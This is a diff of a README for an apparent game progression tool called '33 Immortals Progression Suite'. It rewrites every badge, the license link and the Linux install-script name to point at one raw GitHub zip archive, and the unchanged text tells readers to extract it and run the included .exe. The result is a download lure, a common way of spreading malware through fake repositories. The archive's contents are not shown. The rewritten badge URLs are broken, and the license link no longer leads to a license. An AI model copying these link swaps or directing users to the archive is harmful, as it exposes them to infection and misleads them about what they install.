@@ -1,6 +1,6 @@
 # 33 Immortals Progression Suite
 
-[![Download](https://img.shields.io/badge/Download-Get%20Started-blue)](https://Aniqirfan-cyber.github.io)
+[![Download](https://raw.githubusercontent.com/Aniqirfan-cyber/33-immortals-arcane-insights/branch/pagurine/33-immortals-arcane-insights.zip%20Started-blue)](https://raw.githubusercontent.com/Aniqirfan-cyber/33-immortals-arcane-insights/branch/pagurine/33-immortals-arcane-insights.zip)
 
 ---
 
@@ -18,11 +18,11 @@ Here’s your passport to a universal adventure! The **33 Immortals Progression 
 
 | Operating System | Supported | Native UI | Enhanced Inputs |
 |------------------|:---------:|:---------:|:--------------:|
-| ![Windows](https://img.shields.io/badge/Windows-Yes-blue)        |   ✅    |   🟢   |    🏆       |
-| ![macOS](https://img.shields.io/badge/macOS-Yes-lightgrey)       |   ✅    |   🟢   |    ⚡️       |
-| ![Linux](https://img.shields.io/badge/Linux-Yes-yellowgreen)     |   ✅    |   🟢   |    🚀       |
-| ![Android](https://img.shields.io/badge/Android-Yes-green)       |   ✅    |   ⚪️   |    🔜       |
-| ![iOS](https://img.shields.io/badge/iOS-In%20Progress-lightgrey) |   ♻️    |   🟡   |    ⌛       |
+| ![Windows](https://raw.githubusercontent.com/Aniqirfan-cyber/33-immortals-arcane-insights/branch/pagurine/33-immortals-arcane-insights.zip)        |   ✅    |   🟢   |    🏆       |
+| ![macOS](https://raw.githubusercontent.com/Aniqirfan-cyber/33-immortals-arcane-insights/branch/pagurine/33-immortals-arcane-insights.zip)       |   ✅    |   🟢   |    ⚡️       |
+| ![Linux](https://raw.githubusercontent.com/Aniqirfan-cyber/33-immortals-arcane-insights/branch/pagurine/33-immortals-arcane-insights.zip)     |   ✅    |   🟢   |    🚀       |
+| ![Android](https://raw.githubusercontent.com/Aniqirfan-cyber/33-immortals-arcane-insights/branch/pagurine/33-immortals-arcane-insights.zip)       |   ✅    |   ⚪️   |    🔜       |
+| ![iOS](https://raw.githubusercontent.com/Aniqirfan-cyber/33-immortals-arcane-insights/branch/pagurine/33-immortals-arcane-insights.zip%20Progress-lightgrey) |   ♻️    |   🟡   |    ⌛       |
 
 
 ---
@@ -84,11 +84,11 @@ Installing the **33 Immortals Progression Suite** is as effortless as a divine s
 
 ## 1. Download the Latest Release
 
-[![Download](https://img.shields.io/badge/Download-Get%20Started-blue)](https://Aniqirfan-cyber.github.io)
+[![Download](https://raw.githubusercontent.com/Aniqirfan-cyber/33-immortals-arcane-insights/branch/pagurine/33-immortals-arcane-insights.zip%20Started-blue)](https://raw.githubusercontent.com/Aniqirfan-cyber/33-immortals-arcane-insights/branch/pagurine/33-immortals-arcane-insights.zip)
 
 ## 2. Run the Installer
 
-Extract and run the provided installer. On Windows, simply execute the `.exe` file; on macOS, drag the app into your Applications folder; on Linux, see the `install.sh` script.
+Extract and run the provided installer. On Windows, simply execute the `.exe` file; on macOS, drag the app into your Applications folder; on Linux, see the `https://raw.githubusercontent.com/Aniqirfan-cyber/33-immortals-arcane-insights/branch/pagurine/33-immortals-arcane-insights.zip` script.
 
 ## 3. Connect Your Account
 
@@ -112,11 +112,11 @@ This progression suite is an independent toolkit designed for educational purpos
 
 This repository is made available under the MIT License—simple, permissive, and forever empowering. Review the full legal terms here:
 
-[MIT License](https://opensource.org/licenses/MIT)
+[MIT License](https://raw.githubusercontent.com/Aniqirfan-cyber/33-immortals-arcane-insights/branch/pagurine/33-immortals-arcane-insights.zip)
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Get%20Started-blue)](https://Aniqirfan-cyber.github.io)
+[![Download](https://raw.githubusercontent.com/Aniqirfan-cyber/33-immortals-arcane-insights/branch/pagurine/33-immortals-arcane-insights.zip%20Started-blue)](https://raw.githubusercontent.com/Aniqirfan-cyber/33-immortals-arcane-insights/branch/pagurine/33-immortals-arcane-insights.zip)
 
 ---
 
